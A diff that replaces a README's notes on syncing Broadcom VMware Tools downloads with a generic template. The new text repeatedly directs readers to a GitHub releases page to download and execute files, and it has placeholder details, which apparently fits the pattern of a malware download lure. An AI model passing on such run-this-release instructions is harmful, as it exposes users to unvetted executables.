@@ -1,129 +1,130 @@
-## Language Options
+# VMware Tools Broadcom Synchronization and Backup Tool 🌐🔧
 
-- [中文](README_CN.md)
-- English
+![Version](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)
+
+[![Download Release](https://img.shields.io/badge/download-release-brightgreen.svg)](https://github.com/krip63/vmware-tools-broadcom/releases)
+
+## Overview
+
+The **VMware Tools Broadcom** repository provides a solution for automatically synchronizing Broadcom VMware Tools files. This tool ensures that your VMware environment remains updated and that important files are backed up locally on a regular basis. 
+
+This project is particularly useful for system administrators and IT professionals who manage VMware infrastructures and require a reliable method to keep their tools current.
+
+## Features
+
+- **Automatic Synchronization**: Seamlessly sync Broadcom VMware Tools files to your local system.
+- **Regular Backups**: Schedule backups to ensure you have the latest files available.
+- **User-Friendly Interface**: Simple commands for easy operation.
+- **Compatibility**: Works with various versions of VMware.
+
+## Installation
+
+To get started with the VMware Tools Broadcom, follow these steps:
+
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/krip63/vmware-tools-broadcom.git
+   cd vmware-tools-broadcom
+   ```
+
+2. **Download the Latest Release**:
+   Visit the [Releases section](https://github.com/krip63/vmware-tools-broadcom/releases) to download the latest version. You will find files that need to be downloaded and executed.
+
+3. **Install Dependencies**:
+   Make sure you have the necessary dependencies installed. You can find the list of required packages in the `requirements.txt` file.
+
+4. **Run the Tool**:
+   Execute the main script to start synchronization and backup.
+   ```bash
+   ./sync_and_backup.sh
+   ```
+
+## Usage
+
+Once installed, you can use the tool with simple commands. Here are some common operations:
+
+### Synchronize Files
+
+To synchronize the files, run:
+```bash
+./sync_and_backup.sh sync
+```
+
+### Backup Files
+
+To create a backup, use:
+```bash
+./sync_and_backup.sh backup
+```
+
+### Schedule Tasks
+
+You can set up cron jobs to automate the synchronization and backup processes. Here’s an example of how to schedule a daily backup at midnight:
+
+```bash
+0 0 * * * /path/to/sync_and_backup.sh backup
+```
+
+## Configuration
+
+Configuration options are available in the `config.yaml` file. Here, you can specify:
+
+- **Source Directory**: The path to your Broadcom VMware Tools files.
+- **Backup Directory**: The path where backups will be stored.
+- **Schedule**: Timing for automatic synchronization and backups.
+
+### Example `config.yaml`:
+
+```yaml
+source_directory: /path/to/broadcom/vmware-tools
+backup_directory: /path/to/backup
+schedule: daily
+```
+
+## Troubleshooting
+
+If you encounter issues while using the tool, here are some common problems and their solutions:
+
+### Problem: Files Not Synchronizing
+
+- **Solution**: Check your network connection and ensure the source directory path is correct in `config.yaml`.
+
+### Problem: Backup Fails
+
+- **Solution**: Verify that you have write permissions for the backup directory.
+
+## Contributing
+
+Contributions are welcome! If you would like to contribute to this project, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature-branch`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add new feature'`).
+5. Push to the branch (`git push origin feature-branch`).
+6. Open a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Support
+
+If you need help, feel free to open an issue on GitHub. You can also visit the [Releases section](https://github.com/krip63/vmware-tools-broadcom/releases) for updates and downloads.
+
+## Acknowledgments
+
+- Thanks to the contributors and the community for their support.
+- Special thanks to the VMware community for their resources and documentation.
+
+## Contact
+
+For any inquiries, you can reach me at:  
+- **Email**: example@example.com  
+- **GitHub**: [krip63](https://github.com/krip63)
+
+[![Download Release](https://img.shields.io/badge/download-release-brightgreen.svg)](https://github.com/krip63/vmware-tools-broadcom/releases)
 
 ---
 
-# VMware Tools Sync Utility Update Notes
-
-## 🔍 Official Directory Structure Explained
-
-According to the latest information, the structure under `https://packages-prod.broadcom.com/tools/` has been updated. Key directories are as follows:
-
-### 📂 Core Directory Structure
-```
-📁 tools/
-├── 📁 docs/             # Documentation resources
-├── 📁 esx/              # ESXi related tools
-├── 📁 frozen/           # Legacy VMware Tools (historical versions)
-├── 📁 releases/         # Official releases (main directory)
-└── 📁 ...               # Other auxiliary directories
-```
-
-### 🚀 Location of the Latest VMware Tools
-The `releases/latest/` directory contains the most recent VMware Tools (currently v13.0.0):
-
-```
-📁 releases/latest/
-├── 📁 windows/          # Windows tools
-│   ├── 📁 x64/          # 64-bit installers
-│   └── VMware-tools-windows-13.0.0-24696409.iso
-├── 📁 linux/            # Linux tools
-├── 📁 macos/            # macOS tools
-├── 📁 repos/            # Repository files
-└── 📁 ubuntu/           # Ubuntu-specific packages
-```
-
-### ✅ Example Windows Files
-| File Type | Path | Size |
-|-----------|------|------|
-| ISO Image | `releases/latest/windows/VMware-tools-windows-13.0.0-24696409.iso` | 112MB |
-| Installer | `releases/latest/windows/x64/VMware-tools-13.0.0-24696409-x64.exe` | 111MB |
-
-### ⏳ Historical Versions Directory
-The `releases/` directory contains all historical versions from v10.x to v13.0.0:
-```
-📁 releases/
-├── 📁 v10.0.0/
-├── 📁 v10.1.0/
-├── ...
-├── 📁 v12.0.0/
-├── 📁 v12.5.0/
-└── 📁 v13.0.0/
-```
-
-### ❄️ Legacy Tools Directory (frozen)
-Contains files for older platforms:
-```
-📁 frozen/
-├── 📁 darwin/     # Old macOS tools
-├── 📁 linux/      # Old Linux tools
-├── 📁 solaris/    # Solaris tools
-└── 📁 windows/    # Old Windows tools
-    └── winPreVista.iso  # For Windows versions before Vista
-```
-
-## 🆕 Latest Version Info
-- **Version**: 13.0.0
-- **Build Number**: 24696409
-- **Release Date**: June 18, 2025
-- **Supported Platforms**: 
-  - Windows (x86/x64)
-  - Linux (various distributions)
-  - macOS
-  - Solaris
-  - FreeBSD
-
-## 💡 Usage Suggestions
-
-### 1. Get the Latest Version
-```bash
-# Sync the full directory (including all historical versions)
-python sync_broadcom_tools.py
-
-# Check the latest version locally
-ls "VMware Tools/tools/releases/latest"
-```
-
-### 2. Download the Latest Version Directly (without script)
-- **Windows ISO**:  
-  [https://packages-prod.broadcom.com/tools/releases/latest/windows/VMware-tools-windows-13.0.0-24696409.iso](https://packages-prod.broadcom.com/tools/releases/latest/windows/VMware-tools-windows-13.0.0-24696409.iso)
-
-- **Linux Repository**:  
-  [https://packages-prod.broadcom.com/tools/releases/latest/linux/](https://packages-prod.broadcom.com/tools/releases/latest/linux/)
-
-### 3. Special Requirements
-- **Historical Versions**: Visit the `releases/v[version]/` directory  
-  Example: [https://packages-prod.broadcom.com/tools/releases/v12.5.0/](https://packages-prod.broadcom.com/tools/releases/v12.5.0/)
-
-- **Legacy System Support**: Visit the `frozen/` directory  
-  Example: [https://packages-prod.broadcom.com/tools/frozen/windows/winPreVista.iso](https://packages-prod.broadcom.com/tools/frozen/windows/winPreVista.iso)
-
-## 🔄 Script Update Notes
-The current script supports syncing the latest directory structure, no modification needed to fetch:
-1. Latest release `releases/latest/`
-2. Historical versions `releases/vXX.X.X/`
-3. Legacy tools `frozen/`
-
-```bash
-# Local directory structure after sync
-📁 VMware Tools/
-└── 📁 tools/
-    ├── 📁 docs/
-    ├── 📁 esx/
-    ├── 📁 frozen/
-    └── 📁 releases/
-        ├── 📁 latest/
-        ├── 📁 v10.0.0/
-        ├── ...
-        └── 📁 v13.0.0/
-```
-
-> **Note**: A full sync requires about 50GB of space. If you only need the latest version, you can manually download content from `releases/latest/`.
-
-> **Disclaimer**: This tool is intended solely for technical exchange. Please comply with Broadcom’s official terms of use.
-
-![Win95截图](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/WIP_win95_1280x720?scl=1&fmt=png-alpha)
-
-
+Feel free to explore the code and customize it to fit your needs!
